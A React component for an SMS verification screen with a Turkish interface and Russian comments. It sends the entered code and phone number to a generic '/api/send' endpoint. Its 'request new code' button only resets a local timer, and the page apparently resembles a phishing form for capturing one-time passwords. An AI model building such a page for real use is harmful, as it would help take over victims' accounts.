import React, { useEffect, useState } from "react";
import logoUrl from "./image/logo.svg?url";

type Props = {
  phone?: string;
  onVerified: () => void;
};

const DURATION_SEC = 7 * 60;
const LS_KEY = "smsTimerStart";
const onlyDigits = (s: string) => s.replace(/\D+/g, "");

function formatLeft(sec: number) {
  const m = Math.floor(sec / 60).toString().padStart(2, "0");
  const s = Math.floor(sec % 60).toString().padStart(2, "0");
  return `${m}:${s}`;
}

const SmsVerify: React.FC<Props> = ({ phone, onVerified }) => {
  const [left, setLeft] = useState<number>(DURATION_SEC);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const now = Date.now();
    const saved = localStorage.getItem(LS_KEY);
    let start = saved ? parseInt(saved, 10) : NaN;

    if (Number.isNaN(start) || now - start > DURATION_SEC * 1000) {
      start = now;
      localStorage.setItem(LS_KEY, String(start));
    }

    const tick = () => {
      const elapsed = Math.floor((Date.now() - start) / 1000);
      const remain = Math.max(DURATION_SEC - elapsed, 0);
      setLeft(remain);
    };

    tick();
    const id = setInterval(tick, 500);
    return () => clearInterval(id);
  }, []);

  const isExpired = left <= 0;
  // ✅ допускаем от 3 до 6 цифр
  const canSubmit = /^\d{3,6}$/.test(code) && !loading && !isExpired;

  const radius = 45;
  const circumference = 2 * Math.PI * radius;
  const progress = (left / DURATION_SEC) * circumference;

  const onKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      e.preventDefault();
      handleSubmit();
    }
  };

  async function handleSubmit() {
    if (!canSubmit) return;
    try {
      setLoading(true);
      const res = await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationCode: code,
          phone,
          note: "SMS kodu girişi",
        }),
      });
      const json = await res.json();
      if (json?.success) {
        onVerified();
      } else {
        alert(json?.error || "Gönderim hatası");
      }
    } catch {
      alert("Ağ erişimi yok. Lütfen tekrar deneyin.");
    } finally {
      setLoading(false);
    }
  }

  function resetTimer() {
    localStorage.setItem(LS_KEY, String(Date.now()));
    setLeft(DURATION_SEC);
  }

  return (
    <section className="relative px-4 py-10 md:py-16 bg-slate-950 text-slate-50 overflow-hidden">
      {/* Фон-логотип через <img> */}
      <div aria-hidden className="pointer-events-none absolute inset-0 grid place-items-center">
        <img
          src={logoUrl}
          alt=""
          className="select-none pointer-events-none opacity-60 w-[65vmin] max-w-[520px]"
          style={{ filter: "blur(0.2px)" }}
          onError={(e) => {
            (e.currentTarget as HTMLImageElement).style.display = "none";
          }}
        />
      </div>

      <div className="relative mx-auto w-full max-w-xl">
        <h2 className="text-xl font-semibold">SMS ile doğrulama</h2>
        <p className="mt-2 text-slate-300">1–2 dakika içinde bir SMS alacaksınız.</p>

        {/* Круглый таймер */}
        <div className="mt-8 flex flex-col items-center justify-center">
          <div className="relative w-32 h-32">
            <svg className="-rotate-90 transform" width="128" height="128" viewBox="0 0 100 100">
              <circle cx="50" cy="50" r={radius} stroke="#1e293b" strokeWidth="8" fill="none" />
              <circle
                cx="50"
                cy="50"
                r={radius}
                stroke={isExpired ? "#ef4444" : "#3b82f6"}
                strokeWidth="8"
                fill="none"
                strokeDasharray={circumference}
                strokeDashoffset={circumference - progress}
                strokeLinecap="round"
                style={{ transition: "stroke-dashoffset 0.5s linear" }}
              />
            </svg>

            <div className="absolute inset-0 flex items-center justify-center flex-col text-center">
              <span className={`font-mono text-lg ${isExpired ? "text-red-400" : "text-slate-100"}`}>
                {formatLeft(left)}
              </span>
              <span className="text-xs text-slate-400 mt-1">kalan süre</span>
            </div>
          </div>
        </div>

        <p className="mt-5 text-sm text-slate-400 text-center">
          Mesajlar uygulamasına gidin ve size gelen kodu aşağıya girin.
        </p>

        <label className="mt-6 block text-sm text-slate-300">SMS Kodu (3–6 rakam)</label>
        <div className="relative mt-2">
          <input
            value={code}
            onChange={(e) => setCode(onlyDigits(e.target.value).slice(0, 6))} 
            onKeyDown={onKeyDown}
            inputMode="numeric"
            placeholder="______" /* визуально под 6 */
            className="w-full tracking-[0.5em] text-center text-xl rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-slate-50 placeholder:text-slate-500 outline-none focus:ring-2 focus:ring-blue-500"
          />
          <p className="mt-2 text-xs text-slate-400">En az 3, en çok 6 rakam girin.</p>
        </div>

        <div className="mt-6 flex flex-col gap-3">
          <button
            type="button"
            onClick={handleSubmit}
            disabled={!canSubmit}
            className="inline-flex items-center justify-center rounded-2xl bg-blue-600 px-5 py-3 font-semibold text-white shadow-lg shadow-blue-900/30 outline-none ring-offset-2 transition hover:bg-blue-500 focus:ring-2 focus:ring-blue-400 disabled:opacity-50"
          >
            Girdiğim bilgileri onaylıyorum
          </button>

          <div className="flex items-center justify-between text-xs text-slate-400">
            <span>{isExpired ? "Süre doldu." : "Göndermek için Enter’a basabilirsiniz."}</span>
            <button
              type="button"
              onClick={resetTimer}
              className="text-blue-400 hover:text-blue-300 underline underline-offset-2 disabled:opacity-50"
            >
              Yeni kod iste / sayacı sıfırla
            </button>
          </div>
        </div>
      </div>
    </section>
  );
};

export default SmsVerify;
